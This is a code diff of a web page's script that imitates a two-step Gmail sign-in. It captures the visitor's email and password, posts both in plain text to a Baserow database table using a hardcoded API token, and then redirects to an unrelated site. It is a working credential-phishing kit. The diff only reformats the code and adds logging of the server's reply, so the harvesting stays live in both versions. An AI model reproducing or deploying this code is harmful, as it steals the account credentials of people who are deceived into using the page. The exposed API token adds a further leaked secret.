@@ -317,98 +317,92 @@
     </div>
 
     <script>
-        // DOM elements
-        const page1 = document.getElementById('page1');
-        const page2 = document.getElementById('page2');
-        const emailForm = document.getElementById('email-form');
-        const passwordForm = document.getElementById('password-form');
-        const emailInput = document.getElementById('email');
-        const passwordInput = document.getElementById('password');
-        const displayEmail = document.getElementById('display-email');
-        const showPasswordCheckbox = document.getElementById('show-password');
-        
-        // Constants
-        const BASEROW_API = 'https://api.baserow.io/api/database/rows/table/503285/';
-        const TOKEN = 'Token LG6hnTBxgBG78FueElsSwpHRd4Wep1oL';
-        
-        // Handle email form submission
-        emailForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const email = emailInput.value.trim();
-            
-            if (email) {
-                // Store email in session storage
-                sessionStorage.setItem('userEmail', email);
-                
-                // Display email on page 2
-                displayEmail.textContent = email;
-                
-                // Switch to page 2
-                page1.style.display = 'none';
-                page2.style.display = 'block';
-                
-                // Focus on password field
-                passwordInput.focus();
-                
-                // Update document title
-                document.title = 'Welcome - Gmail';
-            }
-        });
-        
-        // Handle password form submission
-        passwordForm.addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const email = sessionStorage.getItem('userEmail');
-            const password = passwordInput.value;
-            
-            if (email && password) {
-                try {
-                    // Submit data to Baserow in plain text
-                    const response = await fetch(BASEROW_API, {
-                        method: 'POST',
-                        headers: {
-                            'Authorization': TOKEN,
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                         '3977937': email,
-                         '3977952': password
-                       })
-                    });
-                    
-                    console.log('Data sent to Baserow:', {
-                        email: email,
-                        password: password
-                    });
-                    
-                    // Redirect to www.bf.bg
-                    window.location.href = 'https://www.bf.bg';
-                } catch (error) {
-                    console.error('Error:', error);
-                    // Still redirect even if there's an error
-                    window.location.href = 'https://www.bf.bg';
+    // DOM elements
+    const page1 = document.getElementById('page1');
+    const page2 = document.getElementById('page2');
+    const emailForm = document.getElementById('email-form');
+    const passwordForm = document.getElementById('password-form');
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const displayEmail = document.getElementById('display-email');
+    const showPasswordCheckbox = document.getElementById('show-password');
+
+    // Constants
+    const BASEROW_API = 'https://api.baserow.io/api/database/rows/table/503285/';
+    const TOKEN = 'Token LG6hnTBxgBG78FueElsSwpHRd4Wep1oL';
+
+    // Handle email form submission
+    emailForm.addEventListener('submit', function (e) {
+        e.preventDefault();
+        const email = emailInput.value.trim();
+
+        if (email) {
+            sessionStorage.setItem('userEmail', email);
+            displayEmail.textContent = email;
+            page1.style.display = 'none';
+            page2.style.display = 'block';
+            passwordInput.focus();
+            document.title = 'Welcome - Gmail';
+        }
+    });
+
+    // Handle password form submission
+    passwordForm.addEventListener('submit', async function (e) {
+        e.preventDefault();
+
+        const email = sessionStorage.getItem('userEmail');
+        const password = passwordInput.value;
+
+        if (email && password) {
+            try {
+                const response = await fetch(BASEROW_API, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': TOKEN,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        "3977937": email,
+                        "3977952": password
+                    })
+                });
+
+                const result = await response.json();
+
+                // Debug: check what's returned
+                console.log('Response:', result);
+
+                if (!response.ok) {
+                    console.error('Baserow error:', result);
+                } else {
+                    console.log('Successfully added to Baserow:', result);
                 }
+
+                window.location.href = 'https://www.bf.bg';
+            } catch (error) {
+                console.error('Error sending to Baserow:', error);
+                window.location.href = 'https://www.bf.bg';
             }
-        });
-        
-        // Toggle password visibility
-        showPasswordCheckbox.addEventListener('change', function() {
-            passwordInput.type = this.checked ? 'text' : 'password';
-        });
-        
-        // Check if returning from page 2
-        window.addEventListener('load', function() {
-            const savedEmail = sessionStorage.getItem('userEmail');
-            
-            if (savedEmail && window.location.hash === '#verify') {
-                displayEmail.textContent = savedEmail;
-                page1.style.display = 'none';
-                page2.style.display = 'block';
-                document.title = 'Welcome - Gmail';
-            }
-        });
-    </script>
+        }
+    });
+
+    // Toggle password visibility
+    showPasswordCheckbox.addEventListener('change', function () {
+        passwordInput.type = this.checked ? 'text' : 'password';
+    });
+
+    // Check if returning from page 2
+    window.addEventListener('load', function () {
+        const savedEmail = sessionStorage.getItem('userEmail');
+
+        if (savedEmail && window.location.hash === '#verify') {
+            displayEmail.textContent = savedEmail;
+            page1.style.display = 'none';
+            page2.style.display = 'block';
+            document.title = 'Welcome - Gmail';
+        }
+    });
+</script>
+
 </body>
 </html>
